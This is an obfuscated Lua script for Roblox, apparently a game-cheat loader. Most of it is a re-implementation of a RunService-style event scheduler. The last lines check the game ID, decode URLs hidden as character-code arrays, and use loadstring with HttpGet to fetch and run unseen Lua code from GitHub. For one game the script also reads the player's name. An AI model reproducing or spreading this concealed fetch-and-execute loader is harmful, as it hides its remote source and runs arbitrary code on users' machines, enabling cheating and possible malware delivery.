local _0xD=function(b)local r=""for i=1,#b do r=r..string.char(b[i])end return r end
local _0x00=math.floor local _0x01=table.insert local _0x02=pairs local _0x03=ipairs local _0x04=pcall local _0x05=Vector3.new

local _0x06={}local _0x07={}local _0x08=true local _0x09=os.clock()local _0x0A=0 local _0x0B={}local _0x0C=0 local _0x0E=10 local _0x0F=0
local function _0x10()local _s={}_s._c={}
function _s:Connect(_f)local _k={_fn=_f,_a=true}table.insert(_s._c,_k)return{Disconnect=function()_k._a=false _k._fn=nil end}end
function _s:Fire(...)local _i=1 while _i<=#_s._c do local _k=_s._c[_i]if _k._a then local _ok,_=_0x04(_k._fn,...)if not _ok then _0x0F=_0x0F+1 if _0x0F>=_0x0E then warn(string.format("[RS] Max errors (%d)",_0x0E))_0x08=false return end end _i=_i+1 else table.remove(_s._c,_i)end end end
function _s:Wait()local _t=coroutine.running()local _w _w=_s:Connect(function(...)if _w then _w:Disconnect()end task.spawn(_t,...)end)return coroutine.yield()end
return _s end
_0x06.Heartbeat=_0x10()_0x06.RenderStepped=_0x10()_0x06.Stepped=_0x10()
function _0x06:BindToRenderStep(_n,_p,_f)if type(_n)~="string"or type(_f)~="function"then return end _0x07[_n]={Priority=_p or 0,Function=_f}end
function _0x06:UnbindFromRenderStep(_n)_0x07[_n]=nil end
function _0x06:IsRunning()return _0x08 end
task.spawn(function()while _0x08 do local _ok=_0x04(function()local _t=os.clock()local _d=math.min(_t-_0x09,1)_0x09=_t _0x0A=_0x0A+1
if _0x08 then _0x06.Stepped:Fire(_t,_d)end
if _0x08 then local _n=0 for _ in _0x02(_0x07)do _n=_n+1 end if _n~=_0x0C then _0x0B={}for _,_b in _0x02(_0x07)do if _b and type(_b.Function)=="function"then table.insert(_0x0B,_b)end end table.sort(_0x0B,function(_a,_b)return _a.Priority<_b.Priority end)_0x0C=_n end for _i=1,#_0x0B do if not _0x08 then break end local _b=_0x0B[_i]if _b and _b.Function then _0x04(_b.Function,_d)end end end
if _0x08 then _0x06.RenderStepped:Fire(_d)end
if _0x08 then _0x06.Heartbeat:Fire(_d)end end)
if not _ok then _0x0F=_0x0F+1 if _0x0F>=_0x0E then _0x08=false break end else _0x0F=math.max(0,_0x0F-1)end
if _0x08 then task.wait()end end end)

local _a = game.GameId
if _a == 6809578891 then
    local user = game.Players.LocalPlayer.Name
    loadstring(game:HttpGet(_0xD({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,105,116,101,99,104,98,111,105,47,98,105,122,122,97,114,101,104,105,106,105,110,107,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,104,105,110,106,105,107,115,101,46,108,117,97,63,116,61})..os.time()))()
elseif _a == 73885730 then
    loadstring(game:HttpGet(_0xD({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,105,116,101,99,104,98,111,105,47,98,114,111,99,99,111,108,105,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,109,121,109,111,109,115,46,108,117,97,63,116,61})..os.time()))()
else
    notify("Check it", "This game is not supported.", 5)
end
